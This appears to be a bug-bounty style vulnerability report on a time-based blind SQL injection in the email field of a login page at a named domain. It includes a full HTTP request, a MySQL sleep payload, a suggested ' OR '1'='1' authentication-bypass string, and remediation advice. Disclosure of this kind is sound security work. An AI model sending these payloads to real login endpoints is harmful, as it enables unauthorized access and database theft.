# Time-Based Blind SQL Injection in Login `email` Parameter (Potential Authentication Bypass)

## Vulnerability Type
SQL Injection (Blind, Time-Based) - CWE-89 | Related: Improper Authentication — CWE-287

## Summary
The `email` POST parameter on the login endpoint is not sanitized before being used in the backend authentication query. Injecting conditional SQL logic via the `email` field causes a measurable response delay, confirming the input is concatenated directly into a SQL statement. Because this injection point sits in the login/authentication query itself, it carries additional risk beyond data extraction - a crafted boolean-based payload could potentially bypass authentication entirely by manipulating the query's WHERE clause logic.

## Vulnerable Endpoint
```
POST https://kzlabs.in/subdomains/login/index.php?view=login
```

## Steps to Reproduce
1. Intercept the login POST request in Burp Suite.
2. Send to Repeater/Intruder, marking the `email` parameter as the injection point.
3. Submit the payload below in place of a normal email value, with any arbitrary password.
4. Observe a ~10 second response delay compared to the baseline (sub-second) response for a normal failed login attempt.
5. Re-send to confirm the delay is consistent and reproducible.
6. (Recommended follow-up) Attempt a classic auth-bypass payload such as `' OR '1'='1'-- -` in the `email` field to test whether the login logic can be bypassed outright - this would elevate the finding from "blind SQLi" to "authentication bypass."

## Request
```
POST /subdomains/login/index.php?view=login HTTP/2
Host: kzlabs.in
Cookie: PHPSESSID=eku7qbgh4ve6ugik6eftsbautj
Content-Type: application/x-www-form-urlencoded

action=login&email=1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z&password=qwertyui
```

## Payload Used
```
1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
```

## Impact
- **Authentication Bypass (potential):** If the query structure allows it, an attacker could log in as an arbitrary user (possibly admin) without valid credentials.
- **Confidentiality:** Blind extraction of database contents - user table, password hashes, session data - via time-based inference.
- **Severity:** Critical - this is on the authentication path, unauthenticated access point, no user interaction required.

## Recommendations for Fix
1. **Parameterized queries/prepared statements** for the login query - never build SQL from raw `email`/`password` input.
2. **Use proper password verification** (e.g., `password_verify()` against a bcrypt hash) server-side rather than relying on SQL matching for auth.
3. **Rate-limit / lock out** repeated failed login attempts to reduce brute-force and injection probing value.
4. **WAF rule** to block SQLi patterns on login endpoints as an interim mitigation.
5. **Least-privilege DB account** for the web app user.
